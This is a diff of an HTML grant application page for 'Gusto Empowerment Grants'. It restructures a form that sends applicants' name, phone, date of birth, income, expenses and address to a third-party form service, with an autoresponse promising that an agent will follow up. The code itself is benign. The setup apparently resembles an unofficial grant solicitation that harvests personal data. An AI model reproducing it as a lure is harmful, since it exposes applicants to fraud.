@@ -3,130 +3,115 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Apply for Grant</title>
+  <title>Apply - Gusto Empowerment Grants</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <header>
-    <h1>Apply for Grant</h1>
+    <h1>Apply for a Grant</h1>
     <nav>
       <a href="index.html">Home</a>
       <a href="about.html">About</a>
       <a href="apply.html">Apply</a>
+      <a href="agency.html">Agency</a>
       <a href="contact.html">Contact</a>
     </nav>
   </header>
 
   <main>
-    <h2>Apply for Gusto Empowerment Grant</h2>
+    <h2>Grant Application Form</h2>
+    <form action="https://formspree.io/f/mrblqyby" method="POST">
 
-    <form action="https://formspree.io/f/xldnrkyd" method="post" class="grant-form" enctype="multipart/form-data">
-     
-      <!-- Full Name -->
-      <label for="fullName">Full Name*</label>
-      <input type="text" id="fullName" name="fullName" required />
+  <label for="full-name">Full Name</label>
+  <input type="text" id="full-name" name="name" required>
 
-      <!-- Email -->
-      <label for="email">Email Address*</label>
-      <input type="email" id="email" name="email" required />
+  <label for="email">Email Address</label>
+  <input type="email" id="email" name="email" required>
 
-      <label for="dob">Date of Birth</label>
-      <input type="date" id="dob" name="dob" required>
+  <label for="phone">Phone Number</label>
+  <input type="tel" id="phone" name="phone" required>
 
-      <!-- Address -->
-<!-- Country Selector -->
-<label for="country">Select Your Country:</label>
-<select id="country" name="country" onchange="toggleAddressFormat()">
-  <option value="usa">United States</option>
-  <option value="canada">Canada</option>
-</select>
+  <label for="dob">Date of Birth</label>
+  <input type="date" id="dob" name="dob" required>
 
-<!-- USA Address Fields -->
-<div id="usa-address" class="address-format">
-  <label for="us-street">Street Address:</label>
-  <input type="text" id="us-street" name="us-street" required>
+  <label for="income">Total Monthly Income (All Sources)</label>
+  <input type="number" id="income" name="income" required>
 
-  <label for="us-city">City:</label>
-  <input type="text" id="us-city" name="us-city" required>
+  <label for="expenses">Total Monthly Expenses</label>
+  <input type="number" id="expenses" name="expenses" required>
 
-  <label for="us-state">State:</label>
-  <input type="text" id="us-state" name="us-state" required>
+  <label for="grant-amount">Requested Grant Amount</label>
+  <input type="number" id="grant-amount" name="grant_amount" required>
 
-  <label for="us-zip">ZIP Code:</label>
-  <input type="text" id="us-zip" name="us-zip" required>
-</div>
+  <label for="previous-grant">Have you benefited from a grant or federal grant before?</label>
+  <select id="previous-grant" name="previous_grant" required>
+    <option value="">Select</option>
+    <option value="yes">Yes</option>
+    <option value="no">No</option>
+  </select>
 
-<!-- Canada Address Fields -->
-<div id="canada-address" class="address-format" style="display: none;">
-  <label for="ca-street">Street Address:</label>
-  <input type="text" id="ca-street" name="ca-street" required>
+  <label for="purpose">Purpose of Applying</label>
+  <textarea id="purpose" name="purpose" rows="4" required></textarea>
 
-  <label for="ca-city">City:</label>
-  <input type="text" id="ca-city" name="ca-city" required>
+  <label for="country">Country</label>
+  <select id="country" name="country" required>
+    <option value="">Select Country</option>
+    <option value="us">United States</option>
+    <option value="ca">Canada</option>
+  </select>
 
-  <label for="ca-province">Province:</label>
-  <input type="text" id="ca-province" name="ca-province" required>
+  <!-- US Address -->
+  <div class="address address-us" style="display:none;">
+    <label for="street-us">Street Address</label>
+    <input type="text" id="street-us" name="street_us">
 
-  <label for="ca-postal">Postal Code:</label>
-  <input type="text" id="ca-postal" name="ca-postal" required>
-</div>
+    <label for="state">State</label>
+    <input type="text" id="state" name="state">
 
-           <!-- Phone -->
-      <label for="phone">Phone Number*</label>
-      <input type="tel" id="phone" name="phone" required />
+    <label for="zip">ZIP Code</label>
+    <input type="text" id="zip" name="zip">
+  </div>
 
-      <label for="purpose">Purpose of Applying for the Grant</label>
-      <textarea id="purpose" name="purpose" rows="5" placeholder="Briefly describe why you're applying..." required></textarea>
+  <!-- Canada Address -->
+  <div class="address address-ca" style="display:none;">
+    <label for="street-ca">Street Address</label>
+    <input type="text" id="street-ca" name="street_ca">
 
-      <!-- Business Name -->
-      <label for="businessName">Business Name (Optional)</label>
-      <input type="text" id="businessName" name="businessName" />
+    <label for="province">Province</label>
+    <input type="text" id="province" name="province">
 
-      <!-- Income and Expenses -->
-      <label for="expenses">Total Monthly Expenses (USD)*</label>
-      <input type="number" id="expenses" name="expenses" placeholder="$" required />
+    <label for="postal">Postal Code</label>
+    <input type="text" id="postal" name="postal">
+  </div>
 
-      <label for="income">Total Monthly Income from All Sources (USD)*</label>
-      <input type="number" id="income" name="income" placeholder="$" required />
+  <!-- Autoresponse + Redirect -->
+  <input type="hidden" name="_redirect" value="https://yourusername.github.io/thankyou.html">
+  <input type="hidden" name="_autoresponse" value="Thank you for applying. An agent will reach out to you within 1–3 days.">
 
-      <!-- Grant Benefit Question -->
-<label>Have you benefitted from any other grant or federal grant before?*</label>
-<div class="radio-group">
-  <label><input type="radio" name="hasReceivedGrant" value="Yes" required /> Yes</label>
-  <label><input type="radio" name="hasReceivedGrant" value="No" required /> No</label>
-</div>
-      <!-- Requested Amount -->
-      <label for="amount">Requested Grant Amount:</label>
-      <input type="number" id="amount" name="amount" required />
-
-      <!-- Electronic Signature -->
-      <label for="signature">Electronic Signature*</label>
-      <input type="text" id="signature" name="signature" required placeholder="Type your full name" />
-
-      <!-- Submit Button -->
-      <button type="submit">Submit Application</button>
-<input type="hidden" name="_redirect" value="https://gustoweb.github.io/gusto-grants/thankyou.html">
-    </form>
+  <button type="submit">Submit</button>
+</form>
   </main>
 
   <footer>
     <p>&copy; 2025 Gusto Empowerment Grants. All rights reserved.</p>
   </footer>
-<script>
-  function toggleAddressFormat() {
-    const country = document.getElementById("country").value;
-    const usaFields = document.getElementById("usa-address");
-    const canadaFields = document.getElementById("canada-address");
 
-    if (country === "canada") {
-      canadaFields.style.display = "block";
-      usaFields.style.display = "none";
-    } else {
-      usaFields.style.display = "block";
-      canadaFields.style.display = "none";
-    }
-  }
-</script>
-
+  <!-- Country Change Script -->
+  <script>
+    document.getElementById('country').addEventListener('change', function () {
+      const us = document.querySelector('.address-us');
+      const ca = document.querySelector('.address-ca');
+      if (this.value === 'ca') {
+        ca.style.display = 'block';
+        us.style.display = 'none';
+      } else if (this.value === 'us') {
+        us.style.display = 'block';
+        ca.style.display = 'none';
+      } else {
+        us.style.display = 'none';
+        ca.style.display = 'none';
+      }
+    });
+  </script>
 </body>
 </html>
